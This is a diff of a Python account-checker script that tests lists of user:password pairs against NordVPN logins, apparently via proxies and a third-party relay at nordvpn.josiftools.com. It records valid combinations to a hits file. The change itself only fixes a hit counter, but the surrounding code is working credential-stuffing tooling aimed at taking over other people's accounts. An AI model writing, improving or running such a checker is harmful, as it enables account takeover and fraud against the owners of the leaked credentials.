@@ -34,7 +34,7 @@ class NORDVPN:
  -------------------------------------------------------------{en}"""
 		print(banner)
 	def login(selfy,user,password,proxy_url):
-		sys.stdout.write(f"\r⬛CHECKING]: {len(xa)}/{grn}{ok[0]}{en}/{tts[0]}")
+		sys.stdout.write(f"\r⬛CHECKING]: {len(xa)}/{grn}{len(ok)}{en}/{tts[0]}")
 		with requests.Session() as session:
 			url = "https://nordvpn.josiftools.com/nordlogin"
 			params = {
@@ -58,7 +58,7 @@ class NORDVPN:
 				print(f'\r⬛{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
 			elif response['status']=='ok':
 				print(f'\r⬛{grn}{user}:{password}{en}=>{yl}{response["message"]}{en}')
-				ok[0] = '1'
+				ok.append('1')
 				with open("hits_ok.txt","a") as f2:f2.write(f"{user}:{password}\n")
 			else:print(f'\r⬛{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
 
@@ -80,4 +80,5 @@ print(line)
 print(f"\n⬛DONE]: {len(xa)}/{grn}{ok[0]}{en}/{tts[0]}")
 input("enter to exit")
 sys.exit()
+
 
